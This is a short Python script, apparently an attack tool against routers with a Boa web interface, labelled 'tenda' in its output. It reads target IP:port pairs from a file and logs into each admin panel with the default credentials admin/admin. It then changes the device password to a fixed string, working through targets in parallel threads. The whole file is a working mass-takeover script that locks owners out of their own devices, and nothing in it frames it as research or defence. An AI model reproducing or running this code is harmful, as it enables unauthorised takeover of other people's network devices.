import requests
from requests.exceptions import Timeout
from concurrent.futures import ThreadPoolExecutor

# x
with open('ips.txt', 'r') as file:
    ip_ports = [line.strip() for line in file]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
    'Connection': 'close'
}

login_data = {
    'username': 'admin',
    'password': 'admin',
    'timezone': '15:00',
    'dst_enabled': 'OFF',
    'save': 'Login',
    'submit-url': '/admin/login.asp',
    'postSecurityFlag': '65034'
}

password_setup_data = {
    'userMode': '0',
    'oldpass': 'admin',
    'newpass': 'sTAlVaReX109fsPy',
    'confpass': 'sTAlVaReX109fsPy',
    'submit-url': '/password.asp',
    'save': 'Apply Changes',
    'postSecurityFlag': '415'
}

def change_password(ip_port):
    url = f'http://{ip_port}/boaform/admin/formLogin'

    try:
        # x
        response = requests.post(url, headers=headers, data=login_data, allow_redirects=False, timeout=5)
    except Timeout:
        return

    if '<A HREF="/">' in response.text:
        print(f"[tenda] logged in: {ip_port}")

        # Send password setup request after successful login
        password_setup_url = f'http://{ip_port}/boaform/formPasswordSetup'
        try:
            password_setup_response = requests.post(password_setup_url, headers=headers, data=password_setup_data, allow_redirects=False, timeout=5)
        except Timeout:
            return

        # x
        if "/admin/login.asp" in password_setup_response.text:
            print(f"[tenda] key changed for: {ip_port}.")

# x
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(change_password, ip_ports)
